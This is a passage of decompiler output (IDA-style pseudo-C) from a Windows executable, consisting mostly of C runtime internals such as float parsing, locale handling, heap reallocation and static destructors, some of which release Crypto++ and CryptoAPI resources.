  int v7; // [esp-8h] [ebp-28h]
  float *v8; // [esp-4h] [ebp-24h]
  int v9; // [esp+8h] [ebp-18h] BYREF
  char v10[12]; // [esp+Ch] [ebp-14h] BYREF
  float v11; // [esp+18h] [ebp-8h]
  float v12; // [esp+1Ch] [ebp-4h] BYREF

  if ( a2 )
    *a2 = a1;
  if ( a1 )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v9, a3);
    v8 = &v12;
    v7 = v4;
    v6 = v4;
    v12 = 0.0;
    unknown_libname_59(&v6, a1, a2);
    v5 = unknown_libname_75(v10, v6, v7, v8);
    if ( v5 == 3 || v5 == 2 )
      *_errno() = 34;
    v11 = v12;
    if ( v10[8] )
      *(_DWORD *)(v9 + 848) &= ~2u;
    return v11;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0.0;
  }
}
// 49090D: variable 'v4' is possibly undefined
// 48DD77: using guessed type _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const);
// 490A76: using guessed type _DWORD __cdecl unknown_libname_59(_DWORD, _DWORD, _DWORD);
// 490A91: using guessed type _DWORD __cdecl unknown_libname_75(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0049095F) --------------------------------------------------------
double __cdecl sub_49095F(int a1, _DWORD *a2, struct __crt_locale_pointers *a3)
{
  double result; // st7
  _DWORD *v4; // ecx
  int v5; // eax
  _DWORD *v6; // [esp-Ch] [ebp-30h] BYREF
  _DWORD *v7; // [esp-8h] [ebp-2Ch]
  double *v8; // [esp-4h] [ebp-28h]
  int v9; // [esp+8h] [ebp-1Ch] BYREF
  __crt_locale_pointers v10; // [esp+Ch] [ebp-18h] BYREF
  char v11; // [esp+14h] [ebp-10h]
  double v12; // [esp+18h] [ebp-Ch] BYREF

  if ( a2 )
    *a2 = a1;
  if ( a1 )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v9, a3);
    v8 = &v12;
    v7 = v4;
    v6 = v4;
    v12 = 0.0;
    unknown_libname_59(&v6, a1, a2);
    v5 = sub_490B07(&v10, (int)v6, v7, (int)v8);
    if ( v5 == 3 || v5 == 2 )
      *_errno() = 34;
    result = v12;
    if ( v11 )
      *(_DWORD *)(v9 + 848) &= ~2u;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0.0;
  }
  return result;
}
// 49099E: variable 'v4' is possibly undefined
// 48DD77: using guessed type _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const);
// 490A76: using guessed type _DWORD __cdecl unknown_libname_59(_DWORD, _DWORD, _DWORD);

//----- (00490B07) --------------------------------------------------------
int __cdecl sub_490B07(__crt_locale_pointers *a1, int a2, _DWORD *a3, int a4)
{
  int v4; // esi
  int result; // eax
  int v6; // eax
  char v7[780]; // [esp+4h] [ebp-310h] BYREF

  v4 = a4;
  if ( a4 && a1 )
  {
    v6 = __crt_strtox::parse_floating_point_from_source<__crt_strtox::c_string_character_source<char>>(a1, &a2, v7);
    result = __crt_strtox::parse_floating_point_write_result<double>(v6, v7, v4);
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    result = 1;
  }
  if ( a3 )
    *a3 = a2;
  return result;
}
// 490B7D: using guessed type _DWORD __cdecl __crt_strtox::parse_floating_point_from_source<__crt_strtox::c_string_character_source<char>>(_locale_t Locale, _DWORD, _DWORD);
// 4912BF: using guessed type _DWORD __cdecl __crt_strtox::parse_floating_point_write_result<double>(_DWORD, _DWORD, _DWORD);

//----- (00493D86) --------------------------------------------------------
void __cdecl sub_493D86(int a1, _DWORD *a2)
{
  sub_49095F(a1, a2, 0);
}

//----- (00493D9D) --------------------------------------------------------
void __cdecl sub_493D9D(int a1, _DWORD *a2)
{
  sub_4908CE(a1, a2, 0);
}

//----- (00494CF2) --------------------------------------------------------
int __cdecl sub_494CF2(int a1, int a2)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  return unknown_libname_62(a1, a2, 0);
}
// 494D14: using guessed type _DWORD __cdecl unknown_libname_62(_DWORD, _DWORD, _DWORD);

//----- (004960BD) --------------------------------------------------------
int __cdecl sub_4960BD(int a1)
{
  return unknown_libname_58(a1);
}
// 48EDAD: using guessed type _DWORD __stdcall unknown_libname_58(_DWORD);

//----- (00496C23) --------------------------------------------------------
int sub_496C23()
{
  int result; // eax

  result = dword_4F0FE0;
  if ( !dword_4F0FE0 )
  {
    if ( !dword_4F0FE4 || common_initialize_environment_nolock<char>() )
      return 0;
    else
      return initialize_environment_by_cloning_nolock<char>() == 0 ? dword_4F0FE0 : 0;
  }
  return result;
}
// 496C52: using guessed type int common_initialize_environment_nolock<char>(void);
// 496DAB: using guessed type int initialize_environment_by_cloning_nolock<char>(void);
// 4F0FE0: using guessed type int dword_4F0FE0;
// 4F0FE4: using guessed type int dword_4F0FE4;

//----- (00496E6A) --------------------------------------------------------
void *__cdecl sub_496E6A(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != (void *)dword_4F0FEC )
    return (void *)unknown_libname_63(*a1);
  return result;
}
// 496D7C: using guessed type _DWORD __cdecl unknown_libname_63(void *Block);
// 4F0FEC: using guessed type int dword_4F0FEC;

//----- (00496E85) --------------------------------------------------------
void *__cdecl sub_496E85(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != (void *)dword_4F0FE8 )
    return (void *)unknown_libname_63(*a1);
  return result;
}
// 496D7C: using guessed type _DWORD __cdecl unknown_libname_63(void *Block);
// 4F0FE8: using guessed type int dword_4F0FE8;

//----- (00496F97) --------------------------------------------------------
int __cdecl sub_496F97(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 496F46: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 496F97: using guessed type int var_8;

//----- (00496FBF) --------------------------------------------------------
int __cdecl sub_496FBF(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 496EF5: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 496FBF: using guessed type int var_8;

//----- (00497248) --------------------------------------------------------
int __cdecl sub_497248(_onexit_t Function)
{
  return _register_onexit_function(&stru_4F0FF0, Function);
}

//----- (004972DC) --------------------------------------------------------
char sub_4972DC()
{
  unknown_libname_58(&off_4E83D8);
  return 1;
}
// 48EDAD: using guessed type _DWORD __stdcall unknown_libname_58(_DWORD);
// 4E83D8: using guessed type wchar_t *off_4E83D8;

//----- (00497308) --------------------------------------------------------
char sub_497308()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 496EA5: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0049734D) --------------------------------------------------------
__vcrt_bool sub_49734D()
{
  return __vcrt_uninitialize(0);
}

//----- (004973F1) --------------------------------------------------------
int sub_4973F1()
{
  return dword_4F1008;
}
// 4F1008: using guessed type int dword_4F1008;

//----- (004973F7) --------------------------------------------------------
int __cdecl sub_4973F7(int a1)
{
  int result; // eax

  result = a1;
  dword_4F1008 = a1;
  return result;
}
// 4F1008: using guessed type int dword_4F1008;

//----- (0049741F) --------------------------------------------------------
int __cdecl sub_49741F(int a1)
{
  return unknown_libname_58(a1);
}
// 48EDAD: using guessed type _DWORD __stdcall unknown_libname_58(_DWORD);

//----- (0049754B) --------------------------------------------------------
int *sub_49754B()
{
  return &dword_4F1010;
}
// 4F1010: using guessed type int dword_4F1010;

//----- (00497551) --------------------------------------------------------
void **sub_497551()
{
  return &dword_4F1014;
}

//----- (004975D5) --------------------------------------------------------
int __cdecl sub_4975D5(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 497592: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 4975D5: using guessed type int var_8;

//----- (004975FD) --------------------------------------------------------
void __thiscall sub_4975FD(_DWORD *this)
{
  void *v2; // esi
  int v3[5]; // [esp+8h] [ebp-14h] BYREF

  v2 = _calloc_base(1u, 0xB8u);
  *(_DWORD *)*this = v2;
  _free_base(0);
  if ( v2 )
  {
    v3[0] = *this;
    v3[1] = this[1];
    v3[2] = this[2];
    v3[3] = this[3];
    v3[4] = this[4];
    sub_4975D5(4, (int)v3);
  }
}

//----- (004977BD) --------------------------------------------------------
__int32 sub_4977BD()
{
  return _InterlockedExchange(&dword_4F1028, 1);
}
// 4F1028: using guessed type int dword_4F1028;

//----- (004986CC) --------------------------------------------------------
int sub_4986CC()
{
  return dword_4F102C;
}
// 4F102C: using guessed type int dword_4F102C;

//----- (00498701) --------------------------------------------------------
int *sub_498701()
{
  return &dword_4F1030;
}
// 4F1030: using guessed type int dword_4F1030;

//----- (00499B06) --------------------------------------------------------
int __cdecl sub_499B06(int a1)
{
  int v1; // ecx
  int v3; // [esp-14h] [ebp-14h] BYREF
  int v4; // [esp-10h] [ebp-10h]
  int v5; // [esp-Ch] [ebp-Ch]
  int v6; // [esp-8h] [ebp-8h]
  int v7; // [esp-4h] [ebp-4h]

  v7 = v1;
  v6 = 1;
  v5 = 10;
  v4 = v1;
  v3 = v1;
  unknown_libname_59(&v3, a1, 0);
  return __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(0, v3, v4, v5, v6);
}
// 499B0B: variable 'v1' is possibly undefined
// 490A76: using guessed type _DWORD __cdecl unknown_libname_59(_DWORD, _DWORD, _DWORD);
// 4991CF: using guessed type _DWORD __cdecl __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(_DWORD, _DWORD, _DWORD, _DWORD, char);

//----- (00499C34) --------------------------------------------------------
int __cdecl sub_499C34(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(
           &v3,
           a2,
           &v4);
}
// 499BB0: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(_DWORD, _DWORD, _DWORD);
// 499C34: using guessed type int var_8;

//----- (0049A58C) --------------------------------------------------------
int __cdecl sub_49A58C(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(
           &v3,
           a2,
           &v4);
}
// 49A532: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD);
// 49A58C: using guessed type int var_8;

//----- (0049AFEC) --------------------------------------------------------
int __cdecl sub_49AFEC(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(
           &v3,
           a2,
           &v4);
}
// 49AEF8: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD);
// 49AFEC: using guessed type int var_8;

//----- (0049B014) --------------------------------------------------------
int __cdecl sub_49B014(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(
           &v3,
           a2,
           &v4);
}
// 49AEA8: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD);
// 49B014: using guessed type int var_8;

//----- (0049B03C) --------------------------------------------------------
int __cdecl sub_49B03C(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(
           &v3,
           a2,
           &v4);
}
// 49AF59: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD);
// 49B03C: using guessed type int var_8;

//----- (0049B064) --------------------------------------------------------
int __cdecl sub_49B064(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(
           &v3,
           a2,
           &v4);
}
// 49AFA4: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD);
// 49B064: using guessed type int var_8;

//----- (0049B519) --------------------------------------------------------
int __cdecl sub_49B519(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(
           &v3,
           a2,
           &v4);
}
// 49B481: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD);
// 49B519: using guessed type int var_8;

//----- (0049BEB9) --------------------------------------------------------
int __cdecl sub_49BEB9(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
           &v3,
           a2,
           &v4);
}
// 49BE37: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 49BEB9: using guessed type int var_8;

//----- (0049BEE1) --------------------------------------------------------
int __cdecl sub_49BEE1(int a1)
{
  int *v2; // [esp+4h] [ebp-4h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_4F1320
      && ((int)lpCriticalSection[a1 >> 6][2 * (a1 & 0x3F) + 1].LockSemaphore & 1) != 0 )
    {
      v2 = &a1;
      return sub_49BEB9(a1, (int)&v2);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 4F1120: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 4F1320: using guessed type int dword_4F1320;

//----- (0049C54A) --------------------------------------------------------
int __cdecl sub_49C54A(int a1, int *a2)
{
  int result; // eax

  result = *a2;
  if ( *a2 != dword_4F1330 )
  {
    result = dword_4E85A0;
    if ( (dword_4E85A0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = __acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 4A3F7E: using guessed type int __acrt_update_thread_locale_data(void);
// 4E85A0: using guessed type int dword_4E85A0;
// 4F1330: using guessed type int dword_4F1330;

//----- (0049C577) --------------------------------------------------------
void *__cdecl sub_49C577(int a1, void **a2)
{
  void *result; // eax

  result = *a2;
  if ( *a2 != off_4E8B58 )
  {
    result = (void *)dword_4E85A0;
    if ( (dword_4E85A0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (void *)__acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 4A27E3: using guessed type int __acrt_update_thread_multibyte_data(void);
// 4E85A0: using guessed type int dword_4E85A0;

//----- (0049D5EE) --------------------------------------------------------
int __cdecl sub_49D5EE(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<bool>::operator()<_lambda_eee62cb4a147bfbb98180ad682ce6e17_,_lambda_5056f36f92c185fae794536d1ce2027b_ &,_lambda_57c77e0e75d6a1e6f8ecaa6bd26c2518_>(
           &v3,
           a2,
           &v4);
}
// 49D59D: using guessed type _DWORD __stdcall __crt_seh_guarded_call<bool>::operator()<_lambda_eee62cb4a147bfbb98180ad682ce6e17_,_lambda_5056f36f92c185fae794536d1ce2027b_ &,_lambda_57c77e0e75d6a1e6f8ecaa6bd26c2518_>(_DWORD, _DWORD, _DWORD);
// 49D5EE: using guessed type int var_8;

//----- (004A09D3) --------------------------------------------------------
int sub_4A09D3()
{
  dword_4F15C0 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 4F15C0: using guessed type int dword_4F15C0;

//----- (004A2224) --------------------------------------------------------
int __thiscall sub_4A2224(_DWORD **this, void *Block)
{
  int v3; // edi

  v3 = unknown_libname_72();
  if ( v3 )
  {
    _free_base(Block);
    return v3;
  }
  else
  {
    *this[1]++ = Block;
    return 0;
  }
}
// 4A2259: using guessed type int unknown_libname_72(void);

//----- (004A232E) --------------------------------------------------------
int __cdecl sub_4A232E(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 4A22EB: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 4A232E: using guessed type int var_8;

//----- (004A2EEC) --------------------------------------------------------
char *__cdecl sub_4A2EEC(void *Block, unsigned int a2, unsigned int a3)
{
  size_t v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = _msize(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (004A2F75) --------------------------------------------------------
char sub_4A2F75()
{
  hHeap = 0;
  return 1;
}

//----- (004AA224) --------------------------------------------------------
int __cdecl sub_4AA224(double a1)
{
  return _ceil_default(a1);
}
// 4AA230: using guessed type _DWORD __cdecl _ceil_default(double);

//----- (004AA360) --------------------------------------------------------
int __thiscall sub_4AA360(void *this)
{
  return *(_DWORD *)this;
}

//----- (004AA628) --------------------------------------------------------
void *sub_4AA628()
{
  int v0; // ecx

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1430,
          __ExceptionPtr::_PlacementInitBadAllocException,
          &unk_4F1438) )
    terminate(v0);
  return &unk_4F1438;
}
// 4AA649: variable 'v0' is possibly undefined
// 469B45: using guessed type _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 4AA86C: using guessed type int __stdcall __ExceptionPtr::_PlacementInitBadAllocException(void *, void *, void **);

//----- (004AA7FD) --------------------------------------------------------
int __stdcall sub_4AA7FD(int a1)
{
  return 0;
}

//----- (004B75B0) --------------------------------------------------------
void __cdecl sub_4B75B0()
{
  _Mtx_destroy_in_situ((_Mtx_t)&unk_4F1570);
}

//----- (004B7600) --------------------------------------------------------
void __cdecl sub_4B7600()
{
  void *v0; // ecx

  if ( (unsigned int)dword_4E8014 >= 0x10 )
  {
    v0 = (void *)dword_4E8000;
    if ( (unsigned int)(dword_4E8014 + 1) >= 0x1000 )
    {
      v0 = *(void **)(dword_4E8000 - 4);
      if ( (unsigned int)(dword_4E8000 - (_DWORD)v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v0);
  }
  dword_4E8010 = 0;
  dword_4E8014 = 15;
  LOBYTE(dword_4E8000) = 0;
}
// 4E8000: using guessed type int dword_4E8000;
// 4E8010: using guessed type int dword_4E8010;
// 4E8014: using guessed type int dword_4E8014;

//----- (004B7670) --------------------------------------------------------
void __cdecl sub_4B7670()
{
  void *v0; // eax

  if ( (unsigned int)dword_4EEDEC >= 0x10 )
  {
    v0 = (void *)dword_4EEDD8;
    if ( (unsigned int)(dword_4EEDEC + 1) >= 0x1000 )
    {
      if ( (unsigned int)(dword_4EEDD8 - *(_DWORD *)(dword_4EEDD8 - 4) - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v0 = *(void **)(dword_4EEDD8 - 4);
    }
    sub_46C87D(v0);
  }
  dword_4EEDE8 = 0;
  dword_4EEDEC = 15;
  LOBYTE(dword_4EEDD8) = 0;
}
// 4EEDD8: using guessed type int dword_4EEDD8;
// 4EEDE8: using guessed type int dword_4EEDE8;
// 4EEDEC: using guessed type int dword_4EEDEC;

//----- (004B76D0) --------------------------------------------------------
void __cdecl sub_4B76D0()
{
  void *v0; // eax

  if ( (unsigned int)dword_4EEDD4 >= 0x10 )
  {
    v0 = (void *)dword_4EEDC0;
    if ( (unsigned int)(dword_4EEDD4 + 1) >= 0x1000 )
    {
      if ( (unsigned int)(dword_4EEDC0 - *(_DWORD *)(dword_4EEDC0 - 4) - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v0 = *(void **)(dword_4EEDC0 - 4);
    }
    sub_46C87D(v0);
  }
  dword_4EEDD0 = 0;
  dword_4EEDD4 = 15;
  LOBYTE(dword_4EEDC0) = 0;
}
// 4EEDC0: using guessed type int dword_4EEDC0;
// 4EEDD0: using guessed type int dword_4EEDD0;
// 4EEDD4: using guessed type int dword_4EEDD4;

//----- (004B7740) --------------------------------------------------------
void __cdecl sub_4B7740()
{
  off_4E801C[0] = &CryptoPP::NameValuePairs::`vftable';
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4E801C: using guessed type void **off_4E801C[2];

//----- (004B7760) --------------------------------------------------------
void __cdecl sub_4B7760()
{
  int v0; // edx
  void *v1; // esi

  v0 = dword_4EEE28;
  v1 = dword_4EEE2C;
  if ( dword_4EEE24 < (unsigned int)dword_4EEE28 )
    v0 = dword_4EEE24;
  memset(dword_4EEE2C, 0, 4 * v0);
  if ( v0 )
    j_j_unknown_libname_61(v1);
  else
    j_j___free_base(v1);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EEE24: using guessed type int dword_4EEE24;
// 4EEE28: using guessed type int dword_4EEE28;

//----- (004B77F0) --------------------------------------------------------
void __cdecl sub_4B77F0()
{
  int v0; // edx
  void *v1; // esi

  v0 = dword_4EEE40;
  v1 = dword_4EEE44;
  if ( dword_4EEE3C < (unsigned int)dword_4EEE40 )
    v0 = dword_4EEE3C;
  memset(dword_4EEE44, 0, 4 * v0);
  if ( v0 )
    j_j_unknown_libname_61(v1);
  else
    j_j___free_base(v1);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EEE3C: using guessed type int dword_4EEE3C;
// 4EEE40: using guessed type int dword_4EEE40;

//----- (004B7880) --------------------------------------------------------
void __cdecl sub_4B7880()
{
  int v0; // edx
  void *v1; // esi

  v0 = dword_4EEE10;
  v1 = dword_4EEE14;
  if ( dword_4EEE0C < (unsigned int)dword_4EEE10 )
    v0 = dword_4EEE0C;
  memset(dword_4EEE14, 0, 4 * v0);
  if ( v0 )
    j_j_unknown_libname_61(v1);
  else
    j_j___free_base(v1);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EEE0C: using guessed type int dword_4EEE0C;
// 4EEE10: using guessed type int dword_4EEE10;

//----- (004B7910) --------------------------------------------------------
void __cdecl sub_4B7910()
{
  if ( dword_4EEEDC )
    (**(void (__thiscall ***)(int, int))dword_4EEEDC)(dword_4EEEDC, 1);
  dword_4EEEDC = 0;
}
// 4EEEDC: using guessed type int dword_4EEEDC;

//----- (004B7930) --------------------------------------------------------
void __cdecl sub_4B7930()
{
  void *v0; // esi

  v0 = (void *)dword_4EEEE4;
  if ( dword_4EEEE4 )
  {
    if ( *(_DWORD *)dword_4EEEE4 )
      CryptReleaseContext(*(_DWORD *)dword_4EEEE4, 0);
    sub_46C87D(v0);
  }
  dword_4EEEE4 = 0;
}
// 4EEEE4: using guessed type int dword_4EEEE4;

//----- (004B7970) --------------------------------------------------------
void __cdecl sub_4B7970()
{
  int v0; // ecx
  void *v1; // edx

  v0 = dword_4E8054;
  v1 = dword_4E8058;
  if ( dword_4E8050 < (unsigned int)dword_4E8054 )
    v0 = dword_4E8050;
  memset(dword_4E8058, 0, 4 * v0);
  j_j___free_base(v1);
}
// 4E8050: using guessed type int dword_4E8050;
// 4E8054: using guessed type int dword_4E8054;

//----- (004B79E0) --------------------------------------------------------
void __cdecl sub_4B79E0()
{
  int v0; // ecx
  void *v1; // edx

  v0 = dword_4E8044;
  v1 = dword_4E8048;
  if ( dword_4E8040 < (unsigned int)dword_4E8044 )
    v0 = dword_4E8040;
  memset(dword_4E8048, 0, 4 * v0);
  j_j___free_base(v1);
}
// 4E8040: using guessed type int dword_4E8040;
// 4E8044: using guessed type int dword_4E8044;

//----- (004B7A50) --------------------------------------------------------
void __cdecl sub_4B7A50()
{
  int v0; // ecx
  void *v1; // edx
  int v2; // ecx
  void *v3; // edx

